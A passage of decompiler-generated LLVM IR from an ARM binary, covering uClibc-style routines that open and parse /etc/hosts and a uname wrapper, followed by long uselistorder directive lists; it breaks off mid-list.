  %v3_19d6c = load i32, i32* %v2_19d6c, align 4
  %v0_19d70 = load i32, i32* @r6, align 4
  %v1_19d70 = load i32, i32* %r0.global-to-local, align 4
  %v2_19d70 = add i32 %v1_19d70, %v0_19d70
  store i32 %v2_19d70, i32* %r2.global-to-local, align 4
  %v1_19d74 = trunc i32 %v3_19d6c to i8
  %v3_19d74 = add i32 %v2_19d70, 1
  %v4_19d74 = inttoptr i32 %v3_19d74 to i8*
  store i8 %v1_19d74, i8* %v4_19d74, align 1
  %v0_19d78 = load i32, i32* @r4, align 4
  %v1_19d78 = add i32 %v0_19d78, 9
  %v2_19d78 = inttoptr i32 %v1_19d78 to i8*
  %v3_19d78 = load i8, i8* %v2_19d78, align 1
  %v2_19d7c = load i32, i32* %r2.global-to-local, align 4
  %v3_19d7c = add i32 %v2_19d7c, 2
  %v4_19d7c = inttoptr i32 %v3_19d7c to i8*
  store i8 %v3_19d78, i8* %v4_19d7c, align 1
  %v0_19d80 = load i32, i32* @r4, align 4
  %v1_19d80 = add i32 %v0_19d80, 8
  %v2_19d80 = inttoptr i32 %v1_19d80 to i32*
  %v3_19d80 = load i32, i32* %v2_19d80, align 4
  %v1_19d84 = trunc i32 %v3_19d80 to i8
  %v2_19d84 = load i32, i32* %r2.global-to-local, align 4
  %v3_19d84 = add i32 %v2_19d84, 3
  %v4_19d84 = inttoptr i32 %v3_19d84 to i8*
  store i8 %v1_19d84, i8* %v4_19d84, align 1
  %v0_19d88 = load i32, i32* %r0.global-to-local, align 4
  %v1_19d88 = add i32 %v0_19d88, 4
  store i32 %v1_19d88, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_19d8c

dec_label_pc_19d8c:                               ; preds = %bb, %entry, %dec_label_pc_19d64
  %v1_19d90 = phi i32 [ -1, %bb ], [ %v2_19d48, %entry ], [ %v1_19d88, %dec_label_pc_19d64 ]
  %v2_19d8c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_19d8c, i32* @r4, align 4
  store i32 %v9_19d34, i32* @r6, align 4
  ret i32 %v1_19d90

; uselistorder directives
  uselistorder i32 %v2_19d48, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r0.global-to-local, { 1, 4, 5, 2, 6, 3, 0 }
  uselistorder i32 9, { 21, 22, 23, 26, 27, 4, 25, 20, 5, 14, 0, 15, 30, 6, 7, 13, 24, 11, 12, 16, 17, 18, 19, 8, 9, 10, 3, 2, 1, 28, 29 }
  uselistorder i32 5, { 22, 23, 24, 7, 16, 8, 25, 9, 2, 17, 10, 18, 12, 11, 3, 0, 26, 5, 19, 6, 1, 20, 21, 13, 15, 14, 4 }
  uselistorder label %dec_label_pc_19d8c, { 2, 0, 1 }
}

define i32 @__open_etc_hosts() local_unnamed_addr {
entry:
  store i32 add (i32 ptrtoint (i16* @global_var_26010.295 to i32), i32 -34028), i32* @r0, align 4
  %v1_19dac = call i32 @__GI_config_open(i32 add (i32 ptrtoint (i16* @global_var_26010.295 to i32), i32 -34028))
  ret i32 %v1_19dac

; uselistorder directives
  uselistorder i32 (i32)* @__GI_config_open, { 0, 2, 1 }
}

define i32 @__read_etc_hosts_r() local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %tmp10 = call i32 @__decompiler_undefined_function_0()
  %stack_var_0 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %v3_19dc4 = load i32, i32* @r4, align 4
  %v6_19dc4 = load i32, i32* @r5, align 4
  %v9_19dc4 = load i32, i32* @r6, align 4
  %v12_19dc4 = load i32, i32* @r7, align 4
  %v15_19dc4 = load i32, i32* @r8, align 4
  %v18_19dc4 = load i32, i32* @sb, align 4
  %v21_19dc4 = load i32, i32* @sl, align 4
  %v24_19dc4 = load i32, i32* @fp, align 4
  store i32 %tmp10, i32* @r5, align 4
  store i32 %tmp9, i32* @lr, align 4
  store i32 0, i32* %stack_var_-44, align 4
  store i32 -1, i32* @ip, align 4
  store i32 ptrtoint (i16* @global_var_26010.295 to i32), i32* @r4, align 4
  %v2_19dec = inttoptr i32 %tmp9 to i32*
  store i32 -1, i32* %v2_19dec, align 4
  %v0_19df0 = load i32, i32* @r0, align 4
  store i32 %v0_19df0, i32* @r6, align 4
  %v0_19df4 = load i32, i32* @r1, align 4
  %v0_19df8 = load i32, i32* @r2, align 4
  store i32 %v0_19df8, i32* @r8, align 4
  %v0_19dfc = load i32, i32* @r3, align 4
  store i32 %v0_19dfc, i32* @fp, align 4
  %v3_19e00 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_19e00, i32* @r7, align 4
  %tmp = icmp ult i32 %tmp10, 129
  br i1 %tmp, label %.thread, label %dec_label_pc_19e0c

.thread:                                          ; preds = %entry
  store i32 34, i32* @sb, align 4
  br label %dec_label_pc_19fac

dec_label_pc_19e0c:                               ; preds = %entry
  %v2_19e0c = icmp eq i32 %v0_19df0, 0
  br i1 %v2_19e0c, label %dec_label_pc_19e14, label %dec_label_pc_19e34

dec_label_pc_19e14:                               ; preds = %dec_label_pc_19e0c
  %v0_19e14 = call i32 @__open_etc_hosts()
  store i32 %v0_19e14, i32* @r6, align 4
  %v2_19e18 = icmp eq i32 %v0_19e14, 0
  br i1 %v2_19e18, label %dec_label_pc_19e20, label %dec_label_pc_19e34

dec_label_pc_19e20:                               ; preds = %dec_label_pc_19e14
  store i32 %tmp7, i32* %r2.global-to-local, align 4
  %v2_19e24 = inttoptr i32 %tmp7 to i32*
  store i32 0, i32* %v2_19e24, align 4
  %v0_19e28 = call i32 @__GI___errno_location()
  %v1_19e2c = inttoptr i32 %v0_19e28 to i32*
  %v2_19e2c = load i32, i32* %v1_19e2c, align 4
  store i32 %v2_19e2c, i32* @sb, align 4
  br label %dec_label_pc_19fac

dec_label_pc_19e34:                               ; preds = %dec_label_pc_19e14, %dec_label_pc_19e0c
  %v1_19e54 = phi i32 [ %v0_19e14, %dec_label_pc_19e14 ], [ %v0_19df0, %dec_label_pc_19e0c ]
  %v0_19e38 = load i32, i32* @r4, align 4
  %v2_19e38 = add i32 %v0_19e38, -34016
  store i32 %v2_19e38, i32* @r4, align 4
  %v2_19e3c = ptrtoint i32* %stack_var_-44 to i32
  store i32 %tmp6, i32* %ip.global-to-local, align 4
  store i32 %tmp6, i32* @lr, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v2_19e54 = add i32 %v1_19e54, 8
  %v3_19e54 = inttoptr i32 %v2_19e54 to i32*
  store i32 48, i32* %v3_19e54, align 4
  store i32 %tmp9, i32* %r3.global-to-local, align 4
  %v0_19e5c = load i32, i32* @r5, align 4
  %v1_19e5c = add i32 %v0_19e5c, -48
  store i32 %v1_19e5c, i32* %r1.global-to-local, align 4
  %v0_19e60 = load i32, i32* %ip.global-to-local, align 4
  %v1_19e60 = add i32 %v0_19e60, 24
  store i32 %v1_19e60, i32* @ip, align 4
  %v0_19e64 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_19e64, i32* @sb, align 4
  %v0_19e68 = load i32, i32* @lr, align 4
  %v1_19e68 = add i32 %v0_19e68, 32
  store i32 %v1_19e68, i32* @sl, align 4
  %v1_19e6c = load i32, i32* @r6, align 4
  %v2_19e6c = add i32 %v1_19e6c, 16
  %v3_19e6c = inttoptr i32 %v2_19e6c to i32*
  store i32 %v1_19e5c, i32* %v3_19e6c, align 4
  %v0_19e70 = load i32, i32* @r4, align 4
  %v0_19e74 = load i32, i32* @ip, align 4
  store i32 %v0_19e74, i32* %stack_var_-64, align 4
  %v0_19e78 = load i32, i32* %r2.global-to-local, align 4
  %v1_19e78 = load i32, i32* %r3.global-to-local, align 4
  %v2_19e78 = inttoptr i32 %v1_19e78 to i32*
  store i32 %v0_19e78, i32* %v2_19e78, align 4
  %v0_19e7c = load i32, i32* @lr, align 4
  %v1_19e7c = load i32, i32* @r6, align 4
  %v2_19e7c = add i32 %v1_19e7c, 4
  %v3_19e7c = inttoptr i32 %v2_19e7c to i32*
  store i32 %v0_19e7c, i32* %v3_19e7c, align 4
  %v2_19eac = inttoptr i32 %v0_19df4 to i8*
  br label %dec_label_pc_19f80

dec_label_pc_19e84:                               ; preds = %dec_label_pc_19f80
  %v3_19e84 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_19e84, i32* %r1.global-to-local, align 4
  %v0_19e88 = load i32, i32* @fp, align 4
  %v7_19e88 = icmp eq i32 %v0_19e88, 1
  %v1_19e8c = add i32 %v3_19e84, 4
  store i32 %v1_19e8c, i32* @r5, align 4
  %v1_19e90 = load i32, i32* @r7, align 4
  %v2_19e90 = add i32 %v1_19e90, 4
  %v3_19e90 = inttoptr i32 %v2_19e90 to i32*
  store i32 %v1_19e8c, i32* %v3_19e90, align 4
  br i1 %v7_19e88, label %dec_label_pc_19fac, label %dec_label_pc_19e98

dec_label_pc_19e98:                               ; preds = %dec_label_pc_19e84
  %v0_19e98 = load i32, i32* @fp, align 4
  %v7_19e98 = icmp eq i32 %v0_19e98, 2
  br i1 %v7_19e98, label %dec_label_pc_19ea4, label %dec_label_pc_19ec8.preheader

dec_label_pc_19ec8.preheader:                     ; preds = %dec_label_pc_19e98
  %v1_19e9c = load i32, i32* @r5, align 4
  %v1_19ec825 = inttoptr i32 %v1_19e9c to i32*
  %v2_19ec826 = load i32, i32* %v1_19ec825, align 4
  store i32 %v2_19ec826, i32* %r3.global-to-local, align 4
  store i32 %v2_19ec826, i32* %r1.global-to-local, align 4
  %v2_19ecc28 = icmp eq i32 %v2_19ec826, 0
  %v1_19ed429 = add i32 %v1_19e9c, 4
  store i32 %v1_19ed429, i32* @r4, align 4
  br i1 %v2_19ecc28, label %dec_label_pc_19f80, label %dec_label_pc_19ebc

dec_label_pc_19ea4:                               ; preds = %dec_label_pc_19e98
  %v0_19ea4 = load i32, i32* %r1.global-to-local, align 4
  %v1_19ea4 = inttoptr i32 %v0_19ea4 to i32*
  %v2_19ea4 = load i32, i32* %v1_19ea4, align 4
  store i32 %v2_19ea4, i32* @r1, align 4
  %v3_19eac = call i32 @__GI_strcoll(i8* %v2_19eac, i32 %v2_19ea4)
  %v2_19eb0 = icmp eq i32 %v3_19eac, 0
  br i1 %v2_19eb0, label %dec_label_pc_19ee0, label %dec_label_pc_19f80

dec_label_pc_19ebc:                               ; preds = %dec_label_pc_19ec8.preheader, %dec_label_pc_19ebc.dec_label_pc_19ec8_crit_edge
  %v2_19ec830 = phi i32 [ %v2_19ec8, %dec_label_pc_19ebc.dec_label_pc_19ec8_crit_edge ], [ %v2_19ec826, %dec_label_pc_19ec8.preheader ]
  %v3_19ebc = call i32 @__GI_strcasecmp(i8* %v2_19eac, i32 %v2_19ec830)
  %v2_19ec0 = icmp eq i32 %v3_19ebc, 0
  br i1 %v2_19ec0, label %dec_label_pc_19ee0, label %dec_label_pc_19ebc.dec_label_pc_19ec8_crit_edge

dec_label_pc_19ebc.dec_label_pc_19ec8_crit_edge:  ; preds = %dec_label_pc_19ebc
  %v0_19ec8.pre = load i32, i32* @r4, align 4
  %v1_19ec8 = inttoptr i32 %v0_19ec8.pre to i32*
  %v2_19ec8 = load i32, i32* %v1_19ec8, align 4
  store i32 %v2_19ec8, i32* %r3.global-to-local, align 4
  store i32 %v2_19ec8, i32* %r1.global-to-local, align 4
  %v2_19ecc = icmp eq i32 %v2_19ec8, 0
  %v1_19ed4 = add i32 %v0_19ec8.pre, 4
  store i32 %v1_19ed4, i32* @r4, align 4
  br i1 %v2_19ecc, label %dec_label_pc_19f80, label %dec_label_pc_19ebc

dec_label_pc_19ee0:                               ; preds = %dec_label_pc_19ebc, %dec_label_pc_19ea4
  %v0_19ee0 = load i32, i32* @r5, align 4
  %v1_19ee0 = inttoptr i32 %v0_19ee0 to i32*
  %v2_19ee0 = load i32, i32* %v1_19ee0, align 4
  store i32 %v2_19ee0, i32* %r3.global-to-local, align 4
  %v4_19ee0 = add i32 %v0_19ee0, 4
  store i32 %v4_19ee0, i32* @r5, align 4
  %v2_19ee4 = load i32, i32* %stack_var_-64, align 4
  store i32 %v2_19ee4, i32* @ip, align 4
  store i32 0, i32* @lr, align 4
  %v1_19eec = load i32, i32* @r7, align 4
  %v2_19eec = inttoptr i32 %v1_19eec to i32*
  store i32 %v2_19ee0, i32* %v2_19eec, align 4
  %v0_19ef0 = load i32, i32* @lr, align 4
  %v1_19ef0 = load i32, i32* @ip, align 4
  %v2_19ef0 = add i32 %v1_19ef0, 4
  %v3_19ef0 = inttoptr i32 %v2_19ef0 to i32*
  store i32 %v0_19ef0, i32* %v3_19ef0, align 4
  store i32 %tmp6, i32* %r2.global-to-local, align 4
  %v0_19ef8 = load i32, i32* @r8, align 4
  %v7_19ef8 = icmp eq i32 %v0_19ef8, 2
  %v0_19efc = load i32, i32* @r5, align 4
  %v1_19efc = load i32, i32* @r7, align 4
  %v2_19efc = add i32 %v1_19efc, 4
  %v3_19efc = inttoptr i32 %v2_19efc to i32*
  store i32 %v0_19efc, i32* %v3_19efc, align 4
  %v0_19f00 = load i32, i32* @ip, align 4
  %v1_19f00 = load i32, i32* @r7, align 4
  %v2_19f00 = add i32 %v1_19f00, 16
  %v3_19f00 = inttoptr i32 %v2_19f00 to i32*
  store i32 %v0_19f00, i32* %v3_19f00, align 4
  %v0_19f04 = load i32, i32* @sl, align 4
  %v1_19f04 = load i32, i32* %r2.global-to-local, align 4
  %v2_19f04 = add i32 %v1_19f04, 24
  %v3_19f04 = inttoptr i32 %v2_19f04 to i32*
  store i32 %v0_19f04, i32* %v3_19f04, align 4
  br i1 %v7_19ef8, label %dec_label_pc_19f0c, label %dec_label_pc_19f3c

dec_label_pc_19f0c:                               ; preds = %dec_label_pc_19ee0
  %v3_19f0c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_19f0c, i32* %r3.global-to-local, align 4
  %v0_19f10 = load i32, i32* @r8, align 4
  %v1_19f14 = inttoptr i32 %v3_19f0c to i32*
  %v2_19f14 = load i32, i32* %v1_19f14, align 4
  store i32 %v2_19f14, i32* %r1.global-to-local, align 4
  %v0_19f18 = load i32, i32* @sl, align 4
  store i32 %v0_19f18, i32* %r2.global-to-local, align 4
  %v3_19f1c = inttoptr i32 %v2_19f14 to i8*
  %v4_19f1c = call i32 @inet_pton(i32 %v0_19f10, i8* %v3_19f1c, i32 %v0_19f18)
  %tmp23 = icmp slt i32 %v4_19f1c, 1
  br i1 %tmp23, label %dec_label_pc_19f7c, label %dec_label_pc_19f28

dec_label_pc_19f28:                               ; preds = %dec_label_pc_19f0c
  %v0_19f2c = load i32, i32* @r7, align 4
  %v2_19f2c = inttoptr i32 %tmp7 to i32*
  store i32 %v0_19f2c, i32* %v2_19f2c, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  %v0_19f34 = load i32, i32* @r8, align 4
  %v1_19f34 = load i32, i32* @r7, align 4
  %v2_19f34 = add i32 %v1_19f34, 8
  %v3_19f34 = inttoptr i32 %v2_19f34 to i32*
  store i32 %v0_19f34, i32* %v3_19f34, align 4
  %v0_19f74.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_19f70

dec_label_pc_19f3c:                               ; preds = %dec_label_pc_19ee0
  %v0_19f3c = load i32, i32* @r8, align 4
  %v7_19f3c = icmp eq i32 %v0_19f3c, 10
  br i1 %v7_19f3c, label %dec_label_pc_19f44, label %dec_label_pc_19f7c

dec_label_pc_19f44:                               ; preds = %dec_label_pc_19f3c
  %v3_19f44 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_19f44, i32* %r3.global-to-local, align 4
  %v1_19f4c = inttoptr i32 %v3_19f44 to i32*
  %v2_19f4c = load i32, i32* %v1_19f4c, align 4
  store i32 %v2_19f4c, i32* %r1.global-to-local, align 4
  %v0_19f50 = load i32, i32* @sl, align 4
  store i32 %v0_19f50, i32* %r2.global-to-local, align 4
  %v3_19f54 = inttoptr i32 %v2_19f4c to i8*
  %v4_19f54 = call i32 @inet_pton(i32 10, i8* %v3_19f54, i32 %v0_19f50)
  %tmp24 = icmp slt i32 %v4_19f54, 1
  br i1 %tmp24, label %dec_label_pc_19f7c, label %dec_label_pc_19f60

dec_label_pc_19f60:                               ; preds = %dec_label_pc_19f44
  store i32 %tmp7, i32* @ip, align 4
  %v0_19f64 = load i32, i32* @r8, align 4
  %v1_19f64 = load i32, i32* @r7, align 4
  %v2_19f64 = add i32 %v1_19f64, 8
  %v3_19f64 = inttoptr i32 %v2_19f64 to i32*
  store i32 %v0_19f64, i32* %v3_19f64, align 4
  %v0_19f68 = load i32, i32* @r7, align 4
  %v1_19f68 = load i32, i32* @ip, align 4
  %v2_19f68 = inttoptr i32 %v1_19f68 to i32*
  store i32 %v0_19f68, i32* %v2_19f68, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_19f70

dec_label_pc_19f70:                               ; preds = %dec_label_pc_19f28, %dec_label_pc_19f60
  %v0_19f74 = phi i32 [ %v0_19f74.pre, %dec_label_pc_19f28 ], [ 16, %dec_label_pc_19f60 ]
  store i32 0, i32* @sb, align 4
  %v1_19f74 = load i32, i32* @r7, align 4
  %v2_19f74 = add i32 %v1_19f74, 12
  %v3_19f74 = inttoptr i32 %v2_19f74 to i32*
  store i32 %v0_19f74, i32* %v3_19f74, align 4
  br label %dec_label_pc_19fa4

dec_label_pc_19f7c:                               ; preds = %dec_label_pc_19f3c, %dec_label_pc_19f44, %dec_label_pc_19f0c
  store i32 2, i32* @sb, align 4
  br label %dec_label_pc_19f80

dec_label_pc_19f80:                               ; preds = %dec_label_pc_19ec8.preheader, %dec_label_pc_19ebc.dec_label_pc_19ec8_crit_edge, %dec_label_pc_19ea4, %dec_label_pc_19f7c, %dec_label_pc_19e34
  %v0_19f80 = load i32, i32* @r6, align 4
  store i32 %v2_19e3c, i32* %r1.global-to-local, align 4
  store i32 459270, i32* %r2.global-to-local, align 4
  store i32 %v0_19e70, i32* %r3.global-to-local, align 4
  %v4_19f90 = inttoptr i32 %v0_19f80 to i32*
  %v5_19f90 = call i32 @__GI_config_read(i32* %v4_19f90, i32 %v2_19e3c, i32 459270, i32 %v0_19e70)
  %v2_19f94 = icmp eq i32 %v5_19f90, 0
  br i1 %v2_19f94, label %dec_label_pc_19f9c, label %dec_label_pc_19e84

dec_label_pc_19f9c:                               ; preds = %dec_label_pc_19f80
  %v0_19f9c = load i32, i32* @fp, align 4
  %v7_19f9c = icmp eq i32 %v0_19f9c, 1
  br i1 %v7_19f9c, label %dec_label_pc_19fac, label %dec_label_pc_19fa4

dec_label_pc_19fa4:                               ; preds = %dec_label_pc_19f9c, %dec_label_pc_19f70
  %v0_19fa4 = load i32, i32* @r6, align 4
  %v1_19fa8 = inttoptr i32 %v0_19fa4 to i32*
  %v2_19fa8 = call i32 @__GI_config_close(i32* %v1_19fa8)
  br label %dec_label_pc_19fac

dec_label_pc_19fac:                               ; preds = %dec_label_pc_19e84, %.thread, %dec_label_pc_19f9c, %dec_label_pc_19e20, %dec_label_pc_19fa4
  %v0_19fac = load i32, i32* @sb, align 4
  store i32 %v3_19dc4, i32* @r4, align 4
  store i32 %v6_19dc4, i32* @r5, align 4
  store i32 %v9_19dc4, i32* @r6, align 4
  store i32 %v12_19dc4, i32* @r7, align 4
  store i32 %v15_19dc4, i32* @r8, align 4
  store i32 %v18_19dc4, i32* @sb, align 4
  store i32 %v21_19dc4, i32* @sl, align 4
  store i32 %v24_19dc4, i32* @fp, align 4
  ret i32 %v0_19fac

; uselistorder directives
  uselistorder i32 %v2_19ec8, { 1, 2, 3, 0 }
  uselistorder i32 %v0_19ec8.pre, { 1, 0 }
  uselistorder i32 %v0_19e70, { 1, 0 }
  uselistorder i32 %v2_19e3c, { 1, 0 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 4, 3 }
  uselistorder i32 %tmp9, { 2, 0, 1 }
  uselistorder i32 %tmp7, { 3, 2, 1, 0 }
  uselistorder i32 %tmp6, { 2, 1, 0 }
  uselistorder i32* %r3.global-to-local, { 7, 0, 1, 2, 3, 4, 5, 6, 10, 8, 9 }
  uselistorder i32* %r2.global-to-local, { 4, 0, 1, 2, 3, 5, 6, 7, 8 }
  uselistorder i32* %r1.global-to-local, { 5, 0, 1, 2, 3, 7, 4, 6 }
  uselistorder i32 (i32*)* @__GI_config_close, { 1, 0 }
  uselistorder i32 (i32*, i32, i32, i32)* @__GI_config_read, { 2, 0, 1 }
  uselistorder i32 10, { 3, 37, 39, 40, 10, 44, 47, 48, 49, 28, 29, 12, 11, 4, 51, 50, 41, 13, 52, 14, 53, 15, 54, 55, 1, 32, 16, 33, 17, 18, 19, 38, 8, 0, 42, 43, 20, 57, 45, 46, 34, 35, 21, 36, 22, 9, 30, 31, 7, 6, 2, 56, 23, 5, 25, 26, 24, 27, 58 }
  uselistorder i32 (i8*, i32)* @__GI_strcasecmp, { 1, 0 }
  uselistorder i32 (i8*, i32)* @__GI_strcoll, { 18, 19, 20, 21, 22, 23, 24, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17 }
  uselistorder i32 24, { 64, 68, 70, 71, 0, 82, 13, 18, 1, 54, 72, 73, 41, 42, 43, 44, 19, 69, 83, 2, 76, 77, 78, 20, 65, 66, 55, 21, 67, 22, 45, 46, 23, 47, 24, 25, 26, 3, 27, 28, 29, 30, 74, 75, 14, 31, 4, 79, 32, 33, 34, 36, 35, 37, 5, 6, 7, 56, 57, 58, 59, 60, 61, 62, 63, 48, 80, 38, 81, 39, 49, 50, 51, 52, 53, 15, 16, 40, 10, 9, 17, 8, 11, 12, 84 }
  uselistorder i32 -48, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 48, { 5, 38, 24, 6, 35, 36, 25, 26, 27, 28, 0, 1, 30, 7, 31, 32, 2, 8, 33, 9, 39, 10, 40, 41, 42, 11, 13, 12, 14, 37, 3, 15, 34, 16, 18, 29, 17, 19, 20, 21, 22, 23, 4 }
  uselistorder i32 34, { 7, 8, 9, 10, 2, 3, 0, 5, 11, 4, 12, 6, 1 }
  uselistorder i16 0, { 0, 7, 1, 2, 8, 3, 4, 5, 6, 9, 10, 11, 12, 13, 14, 15 }
  uselistorder i32 ptrtoint (i16* @global_var_26010.295 to i32), { 93, 20, 21, 22, 92, 3, 4, 23, 91, 1, 90, 89, 88, 87, 86, 85, 24, 25, 84, 83, 19, 82, 81, 5, 26, 80, 79, 78, 6, 27, 77, 76, 7, 8, 75, 9, 74, 10, 73, 11, 72, 28, 71, 29, 70, 12, 13, 69, 30, 68, 67, 66, 65, 31, 64, 32, 63, 62, 33, 61, 2, 35, 34, 36, 14, 60, 15, 37, 38, 59, 40, 58, 57, 56, 55, 16, 54, 42, 41, 39, 43, 53, 44, 52, 17, 51, 50, 18, 49, 45, 48, 0, 46, 47 }
  uselistorder i32* @fp, { 37, 38, 39, 40, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 0, 63, 73, 74, 75, 76, 77, 78, 79, 80, 81, 5, 6, 82, 83, 1, 84, 85, 86, 87, 41, 42, 43, 44, 45, 46, 47, 48, 2, 59, 60, 61, 62, 132, 134, 133, 135, 117, 118, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 64, 65, 66, 67, 68, 69, 70, 71, 72, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 3, 31, 32, 33, 34, 35, 36, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 136, 137, 138, 139, 140, 141, 142, 149, 150, 148, 143, 144, 145, 146, 147, 4 }
  uselistorder i32* @sl, { 30, 31, 32, 33, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 55, 56, 57, 58, 59, 0, 60, 1, 61, 62, 63, 64, 65, 66, 67, 68, 69, 9, 10, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 34, 35, 36, 37, 38, 6, 7, 11, 12, 49, 50, 51, 52, 53, 54, 84, 85, 86, 2, 87, 88, 89, 90, 91, 92, 94, 3, 93, 96, 95, 97, 98, 99, 100, 80, 81, 82, 83, 13, 14, 15, 16, 17, 18, 19, 4, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 5, 8 }
  uselistorder i32* @sb, { 17, 18, 19, 20, 25, 26, 27, 28, 29, 30, 43, 31, 32, 33, 2, 34, 71, 72, 3, 73, 74, 75, 76, 77, 78, 79, 6, 7, 8, 80, 81, 82, 83, 84, 85, 86, 21, 22, 23, 24, 35, 36, 37, 38, 39, 40, 41, 42, 89, 92, 90, 91, 93, 87, 88, 9, 10, 11, 12, 13, 14, 15, 0, 16, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 1, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 4, 5 }
  uselistorder i32* @r8, { 40, 41, 42, 43, 44, 45, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 63, 69, 72, 7, 73, 74, 75, 76, 77, 3, 78, 79, 80, 81, 82, 83, 17, 18, 19, 84, 85, 86, 87, 88, 89, 90, 91, 92, 46, 47, 48, 49, 20, 21, 22, 8, 11, 12, 4, 13, 64, 65, 5, 66, 67, 68, 95, 96, 97, 98, 99, 6, 100, 101, 102, 103, 104, 105, 106, 107, 9, 10, 93, 94, 70, 71, 23, 24, 0, 25, 30, 31, 32, 33, 34, 35, 2, 36, 1, 37, 38, 39, 14, 15, 61, 62, 26, 27, 28, 29, 16 }
  uselistorder label %dec_label_pc_19fac, { 4, 2, 0, 3, 1 }
  uselistorder label %dec_label_pc_19f80, { 3, 1, 2, 0, 4 }
  uselistorder label %dec_label_pc_19f7c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_19f70, { 1, 0 }
  uselistorder label %dec_label_pc_19ebc, { 1, 0 }
}

define i32 @uname(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_19fc8 = load i32, i32* @r7, align 4
  store i32 %v3_19fc8, i32* %stack_var_-8, align 4
  %v0_19fd4 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_19fd4, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_19fd4, -4095
  br i1 %tmp, label %dec_label_pc_19ff4, label %dec_label_pc_19fe4

dec_label_pc_19fe4:                               ; preds = %entry
  %v0_19fe4 = call i32 @__GI___errno_location()
  %v0_19fe8 = load i32, i32* %r7.global-to-local, align 4
  %v1_19fe8 = sub i32 0, %v0_19fe8
  %v2_19fec = inttoptr i32 %v0_19fe4 to i32*
  store i32 %v1_19fe8, i32* %v2_19fec, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_19ff4.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_19ff4

dec_label_pc_19ff4:                               ; preds = %entry, %dec_label_pc_19fe4
  %v1_19ff8 = phi i32 [ %v0_19fd4, %entry ], [ -1, %dec_label_pc_19fe4 ]
  %v2_19ff4 = phi i32 [ %v3_19fc8, %entry ], [ %v2_19ff4.pre, %dec_label_pc_19fe4 ]
  store i32 %v2_19ff4, i32* @r7, align 4
  ret i32 %v1_19ff8

; uselistorder directives
  uselistorder i32 %v0_19fd4, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder i32 ()* @__GI___errno_location, { 50, 49, 37, 47, 46, 45, 44, 84, 83, 82, 22, 39, 36, 57, 81, 80, 77, 48, 35, 56, 55, 79, 78, 76, 75, 74, 73, 5, 41, 59, 19, 11, 72, 10, 25, 9, 18, 17, 16, 43, 42, 71, 70, 69, 40, 15, 14, 66, 24, 34, 33, 58, 13, 28, 31, 60, 30, 54, 53, 52, 68, 7, 6, 8, 2, 4, 38, 65, 12, 67, 0, 51, 3, 26, 64, 27, 32, 63, 62, 61, 21, 1, 20, 85, 29, 23 }
  uselistorder i32* @r7, { 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 151, 152, 153, 154, 155, 156, 157, 158, 165, 166, 167, 168, 169, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 21, 22, 23, 24, 0, 25, 2, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 78, 4, 79, 80, 81, 26, 27, 28, 29, 30, 31, 32, 33, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 82, 1, 83, 84, 85, 86, 5, 170, 171, 120, 6, 121, 122, 123, 124, 125, 126, 34, 35, 40, 41, 42, 43, 36, 37, 38, 39, 44, 45, 46, 47, 271, 272, 76, 77, 241, 242, 232, 233, 48, 234, 230, 231, 273, 274, 275, 280, 281, 7, 16, 17, 49, 50, 3, 51, 15, 52, 53, 243, 244, 249, 250, 251, 252, 253, 254, 255, 245, 246, 247, 248, 159, 160, 161, 162, 163, 164, 256, 257, 258, 259, 260, 261, 262, 263, 8, 264, 265, 266, 217, 218, 267, 268, 226, 227, 68, 69, 221, 222, 223, 9, 224, 225, 87, 88, 89, 90, 91, 92, 93, 10, 177, 178, 172, 11, 173, 